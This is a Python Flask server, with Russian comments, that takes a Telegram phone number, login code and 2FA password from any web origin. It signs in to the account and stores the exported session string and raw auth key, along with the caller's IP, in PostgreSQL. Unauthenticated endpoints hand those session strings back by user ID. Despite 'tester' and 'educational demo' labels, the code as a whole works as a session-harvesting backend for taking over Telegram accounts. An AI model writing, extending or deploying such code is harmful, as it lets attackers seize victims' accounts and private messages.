import os
import asyncio
import logging
import time
import threading
import json
import psycopg2
from datetime import datetime
from flask import Flask, request, jsonify
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, 
    PhoneCodeInvalid, 
    PhoneNumberInvalid, 
    PhoneCodeExpired,
    FloodWait
)

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Конфигурация PostgreSQL
POSTGRES_CONFIG = {
    'host': os.getenv('POSTGRES_HOST', 'localhost'),
    'port': os.getenv('POSTGRES_PORT', '5432'),
    'database': os.getenv('POSTGRES_DB', 'telegram_sessions'),
    'user': os.getenv('POSTGRES_USER', 'postgres'),
    'password': os.getenv('POSTGRES_PASSWORD', 'password')
}

class DatabaseManager:
    def __init__(self):
        self.conn = None
        self.connect()
        self.init_tables()
    
    def connect(self):
        """Подключение к PostgreSQL"""
        try:
            self.conn = psycopg2.connect(**POSTGRES_CONFIG)
            logger.info("✅ Подключение к PostgreSQL установлено")
        except Exception as e:
            logger.error(f"❌ Ошибка подключения к PostgreSQL: {e}")
    
    def init_tables(self):
        """Инициализация таблиц"""
        try:
            with self.conn.cursor() as cur:
                # Таблица пользователей
                cur.execute('''
                    CREATE TABLE IF NOT EXISTS users (
                        id BIGSERIAL PRIMARY KEY,
                        user_id BIGINT UNIQUE NOT NULL,
                        phone_number VARCHAR(20) NOT NULL,
                        first_name VARCHAR(255),
                        last_name VARCHAR(255),
                        username VARCHAR(255),
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )
                ''')
                
                # Таблица TData сессий
                cur.execute('''
                    CREATE TABLE IF NOT EXISTS tdata_sessions (
                        id BIGSERIAL PRIMARY KEY,
                        user_id BIGINT REFERENCES users(user_id) ON DELETE CASCADE,
                        session_string TEXT NOT NULL,
                        auth_key BYTEA,
                        dc_id INTEGER NOT NULL,
                        api_id INTEGER NOT NULL,
                        api_hash VARCHAR(255) NOT NULL,
                        device_model VARCHAR(100),
                        system_version VARCHAR(50),
                        app_version VARCHAR(50),
                        lang_code VARCHAR(10),
                        system_lang_code VARCHAR(10),
                        ip_address INET,
                        user_agent TEXT,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        is_active BOOLEAN DEFAULT TRUE
                    )
                ''')
                
                # Таблица для хранения полного TData
                cur.execute('''
                    CREATE TABLE IF NOT EXISTS tdata_full (
                        id BIGSERIAL PRIMARY KEY,
                        user_id BIGINT REFERENCES users(user_id) ON DELETE CASCADE,
                        tdata_json JSONB NOT NULL,
                        session_id BIGINT REFERENCES tdata_sessions(id) ON DELETE CASCADE,
                        exported_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )
                ''')
                
                self.conn.commit()
                logger.info("✅ Таблицы PostgreSQL инициализированы")
                
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации таблиц: {e}")
    
    def save_user(self, user_data):
        """Сохранение пользователя в базу"""
        try:
            with self.conn.cursor() as cur:
                cur.execute('''
                    INSERT INTO users (user_id, phone_number, first_name, last_name, username)
                    VALUES (%s, %s, %s, %s, %s)
                    ON CONFLICT (user_id) 
                    DO UPDATE SET 
                        first_name = EXCLUDED.first_name,
                        last_name = EXCLUDED.last_name,
                        username = EXCLUDED.username,
                        updated_at = CURRENT_TIMESTAMP
                    RETURNING id
                ''', (
                    user_data['id'],
                    user_data.get('phone_number', ''),
                    user_data.get('first_name', ''),
                    user_data.get('last_name', ''),
                    user_data.get('username', '')
                ))
                self.conn.commit()
                return True
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения пользователя: {e}")
            return False
    
    def save_tdata_session(self, user_id, session_data, request_info=None):
        """Сохранение TData сессии"""
        try:
            with self.conn.cursor() as cur:
                cur.execute('''
                    INSERT INTO tdata_sessions 
                    (user_id, session_string, auth_key, dc_id, api_id, api_hash, 
                     device_model, system_version, app_version, lang_code, system_lang_code,
                     ip_address, user_agent)
                    VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
                    RETURNING id
                ''', (
                    user_id,
                    session_data.get('session_string'),
                    session_data.get('auth_key'),
                    session_data.get('dc_id'),
                    session_data.get('api_id'),
                    session_data.get('api_hash'),
                    session_data.get('device_model', 'Pyrogram'),
                    session_data.get('system_version', '1.0'),
                    session_data.get('app_version', '1.0'),
                    session_data.get('lang_code', 'en'),
                    session_data.get('system_lang_code', 'en'),
                    request_info.get('ip') if request_info else None,
                    request_info.get('user_agent') if request_info else None
                ))
                session_id = cur.fetchone()[0]
                self.conn.commit()
                return session_id
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения TData сессии: {e}")
            return None
    
    def save_full_tdata(self, user_id, session_id, tdata_json):
        """Сохранение полного TData в JSON формате"""
        try:
            with self.conn.cursor() as cur:
                cur.execute('''
                    INSERT INTO tdata_full (user_id, session_id, tdata_json)
                    VALUES (%s, %s, %s)
                    RETURNING id
                ''', (user_id, session_id, json.dumps(tdata_json)))
                tdata_id = cur.fetchone()[0]
                self.conn.commit()
                return tdata_id
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения полного TData: {e}")
            return None
    
    def get_user_sessions(self, user_id):
        """Получение всех сессий пользователя"""
        try:
            with self.conn.cursor() as cur:
                cur.execute('''
                    SELECT ts.id, ts.session_string, ts.dc_id, ts.created_at, ts.is_active,
                           u.phone_number, u.first_name, u.username
                    FROM tdata_sessions ts
                    JOIN users u ON ts.user_id = u.user_id
                    WHERE ts.user_id = %s
                    ORDER BY ts.created_at DESC
                ''', (user_id,))
                
                sessions = []
                for row in cur.fetchall():
                    sessions.append({
                        'id': row[0],
                        'session_string': row[1],
                        'dc_id': row[2],
                        'created_at': row[3].isoformat(),
                        'is_active': row[4],
                        'phone_number': row[5],
                        'first_name': row[6],
                        'username': row[7]
                    })
                return sessions
        except Exception as e:
            logger.error(f"❌ Ошибка получения сессий пользователя: {e}")
            return []
    
    def deactivate_session(self, session_id):
        """Деактивация сессии"""
        try:
            with self.conn.cursor() as cur:
                cur.execute('''
                    UPDATE tdata_sessions 
                    SET is_active = FALSE 
                    WHERE id = %s
                ''', (session_id,))
                self.conn.commit()
                return True
        except Exception as e:
            logger.error(f"❌ Ошибка деактивации сессии: {e}")
            return False

# Инициализация базы данных
db_manager = DatabaseManager()

# Создаем отдельный event loop для асинхронных операций
class AsyncRunner:
    def __init__(self):
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.thread.start()
    
    def _run_loop(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()
    
    def run_coroutine(self, coro):
        future = asyncio.run_coroutine_threadsafe(coro, self.loop)
        return future.result(timeout=30)

# Глобальный runner для асинхронных операций
async_runner = AsyncRunner()

# Добавляем CORS headers
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

def load_api_keys():
    """Загружаем API ключи с проверкой"""
    try:
        from dotenv import load_dotenv
        load_dotenv()
        logger.info("✅ .env файл загружен")
    except ImportError:
        logger.warning("⚠️ python-dotenv не установлен")
    
    # Получаем ключи из переменных окружения
    api_id = os.getenv('TELEGRAM_API_ID')
    api_hash = os.getenv('TELEGRAM_API_HASH')
    secret_key = os.getenv('SECRET_KEY', 'educational-demo-secret-key-2024')
    
    return api_id, api_hash, secret_key

# Загружаем ключи при старте
API_ID, API_HASH, SECRET_KEY = load_api_keys()
app.secret_key = SECRET_KEY

# Хранилище для активных сессий
AUTH_SESSIONS = {}

class TelegramAuthTester:
    def __init__(self):
        self.api_id = None
        self.api_hash = None
        self.initialized = False
        self.initialize_client()
        
    def initialize_client(self):
        """Инициализируем клиент с проверкой ключей"""
        try:
            if not API_ID or not API_HASH:
                logger.error("❌ API ключи не установлены")
                self.initialized = False
                return
                
            self.api_id = int(API_ID)
            self.api_hash = API_HASH
            self.initialized = True
            logger.info(f"✅ Pyrogram тестер инициализирован с API_ID: {self.api_id}")
            
        except ValueError as e:
            logger.error(f"❌ Неверный формат API_ID: {e}")
            self.initialized = False
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации: {e}")
            self.initialized = False
    
    async def export_tdata_to_db(self, client, user_info, request_info=None):
        """Экспорт TData в базу данных"""
        try:
            # Экспортируем session string
            session_string = await client.export_session_string()
            
            # Получаем информацию о сессии
            tdata_info = {
                'version': '1.0',
                'user_id': user_info['id'],
                'phone_number': user_info.get('phone_number', ''),
                'first_name': user_info.get('first_name', ''),
                'last_name': user_info.get('last_name', ''),
                'username': user_info.get('username', ''),
                'session_string': session_string,
                'auth_key': client.auth_key.key.hex() if client.auth_key else None,
                'dc_id': client.dc_id,
                'api_id': self.api_id,
                'api_hash': self.api_hash,
                'device_model': 'Pyrogram Export',
                'system_version': '1.0',
                'app_version': '1.0',
                'lang_code': 'en',
                'system_lang_code': 'en',
                'exported_at': datetime.now().isoformat()
            }
            
            # Сохраняем пользователя
            db_manager.save_user(user_info)
            
            # Сохраняем сессию
            session_data = {
                'session_string': session_string,
                'auth_key': client.auth_key.key if client.auth_key else None,
                'dc_id': client.dc_id,
                'api_id': self.api_id,
                'api_hash': self.api_hash,
                'device_model': 'Pyrogram Export',
                'system_version': '1.0',
                'app_version': '1.0',
                'lang_code': 'en',
                'system_lang_code': 'en'
            }
            
            session_id = db_manager.save_tdata_session(
                user_info['id'], 
                session_data, 
                request_info
            )
            
            if session_id:
                # Сохраняем полный TData
                tdata_id = db_manager.save_full_tdata(
                    user_info['id'], 
                    session_id, 
                    tdata_info
                )
                
                logger.info(f"💾 TData сохранен в базу. Session ID: {session_id}, TData ID: {tdata_id}")
                
                return {
                    'success': True,
                    'session_id': session_id,
                    'tdata_id': tdata_id,
                    'user_id': user_info['id'],
                    'session_string': session_string,
                    'message': 'TData успешно экспортирован в базу данных'
                }
            else:
                return {'success': False, 'error': 'Ошибка сохранения сессии в базу'}
                
        except Exception as e:
            logger.error(f"❌ Ошибка экспорта TData в базу: {e}")
            return {'success': False, 'error': f'Ошибка экспорта: {str(e)}'}
    
    async def full_auth_and_export(self, phone_number, code, password_2fa=None, request_info=None):
        """Полная аутентификация и экспорт TData в базу"""
        client = None
        try:
            # Создаем временного клиента
            session_name = f"temp_session_{int(time.time())}"
            client = Client(
                name=session_name,
                api_id=self.api_id,
                api_hash=self.api_hash,
                in_memory=True
            )
            
            await client.connect()
            
            # Запрашиваем код
            sent_code = await client.send_code(phone_number)
            
            # Входим с кодом
            await client.sign_in(
                phone_number=phone_number,
                phone_code_hash=sent_code.phone_code_hash,
                phone_code=code
            )
            
            # Если требуется 2FA
            if password_2fa:
                await client.check_password(password_2fa)
            
            # Получаем информацию о пользователе
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'phone_number': me.phone_number,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'username': me.username
            }
            
            # Экспортируем TData в базу
            export_result = await self.export_tdata_to_db(client, user_info, request_info)
            
            await client.disconnect()
            
            if export_result['success']:
                return {
                    'success': True,
                    'message': 'Аутентификация и экспорт TData успешны!',
                    'user_info': user_info,
                    'export_info': export_result
                }
            else:
                return export_result
                
        except SessionPasswordNeeded:
            logger.info("🔒 Требуется 2FA пароль")
            return {
                'success': True,
                'message': 'Требуется пароль 2FA',
                'needs_password': True
            }
        except Exception as e:
            if client:
                await client.disconnect()
            logger.error(f"❌ Ошибка аутентификации: {e}")
            return {'success': False, 'error': f'Ошибка аутентификации: {str(e)}'}

# Инициализация
auth_tester = TelegramAuthTester()

# 🎯 API Endpoints
@app.route('/api/auth/export-tdata', methods=['POST', 'OPTIONS'])
def export_tdata_to_db():
    """Полная аутентификация и экспорт TData в базу"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        phone = data.get('phone', '').strip()
        code = data.get('code', '').strip()
        password_2fa = data.get('password_2fa', '')
        
        if not phone or not code:
            return jsonify({'success': False, 'error': 'Введите номер и код'}), 400
        
        # Информация о запросе для логирования
        request_info = {
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent')
        }
        
        result = async_runner.run_coroutine(
            auth_tester.full_auth_and_export(phone, code, password_2fa, request_info)
        )
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка экспорта TData: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/api/sessions/user/<user_id>', methods=['GET'])
def get_user_sessions(user_id):
    """Получение всех сессий пользователя"""
    try:
        sessions = db_manager.get_user_sessions(int(user_id))
        return jsonify({
            'success': True,
            'user_id': user_id,
            'sessions': sessions,
            'total': len(sessions)
        })
    except Exception as e:
        logger.error(f"❌ Ошибка получения сессий: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/sessions/deactivate/<session_id>', methods=['POST'])
def deactivate_session(session_id):
    """Деактивация сессии"""
    try:
        success = db_manager.deactivate_session(int(session_id))
        if success:
            return jsonify({'success': True, 'message': 'Сессия деактивирована'})
        else:
            return jsonify({'success': False, 'error': 'Ошибка деактивации'}), 500
    except Exception as e:
        logger.error(f"❌ Ошибка деактивации сессии: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/db/status', methods=['GET'])
def db_status():
    """Статус базы данных"""
    try:
        with db_manager.conn.cursor() as cur:
            # Количество пользователей
            cur.execute('SELECT COUNT(*) FROM users')
            users_count = cur.fetchone()[0]
            
            # Количество активных сессий
            cur.execute('SELECT COUNT(*) FROM tdata_sessions WHERE is_active = TRUE')
            active_sessions = cur.fetchone()[0]
            
            # Общее количество TData записей
            cur.execute('SELECT COUNT(*) FROM tdata_full')
            tdata_count = cur.fetchone()[0]
            
        return jsonify({
            'success': True,
            'database_status': 'connected',
            'statistics': {
                'total_users': users_count,
                'active_sessions': active_sessions,
                'total_tdata_records': tdata_count
            }
        })
    except Exception as e:
        logger.error(f"❌ Ошибка проверки статуса БД: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
